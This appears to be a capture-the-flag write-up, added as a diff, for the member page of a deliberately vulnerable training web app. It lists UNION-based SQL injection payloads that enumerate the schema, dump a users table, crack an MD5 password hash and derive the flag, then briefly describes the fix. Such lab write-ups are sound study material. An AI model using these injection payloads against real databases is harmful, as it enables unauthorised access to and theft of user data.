@@ -1,0 +1,25 @@
+The vulnerability is about the member page
+Here, if we try to search 1+2, you'll get the same result as if you put 3`
+So now, we know that we'll be able to do some SQL injections
+We will proceed the same way as the image_search, i'll only put here the injections and the result, for more details, go to 3_SQL_image_search
+
+25 UNION SELECT 1, database()
+=> Member_Sql_Injection
+
+25 UNION SELECT 1, TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA = char(077,101,109,098,101,114,095,083,113,108,095,073,110,106,101,099,116,105,111,110)
+=> users
+
+25 UNION SELECT 1, COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = CHAR(077,101,109,098,101,114,095,083,113,108,095,073,110,106,101,099,116,105,111,110) AND TABLE_NAME = CHAR(117,115,101,114,115)
+=> user_id, first_name, last_name, town, country, planet, Commentaire, countersign
+
+25 UNION SELECT user_id, Commentaire FROM users
+=> "Decrypt this password -> then lower all the char. Sh256 on it and it's good !"
+
+25 UNION SELECT user_id, countersign FROM users
+=> 5ff9d0165b4f92b14994e5c685cdce28
+
+if we decrypt this sequence using Md5, we get FortyTwo
+now if we use sha256 for fortytwo, we get the flag: 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
+
+how to correct: - just like for image search, DON'T and NEVER use something like: "SELECT  * FROM users WHERE id : '" + id_not_protected + "'"
+                - like image search, there is several different ways to do it safely, like using mysql_real_escape_string(), or use the PDO (if supported)
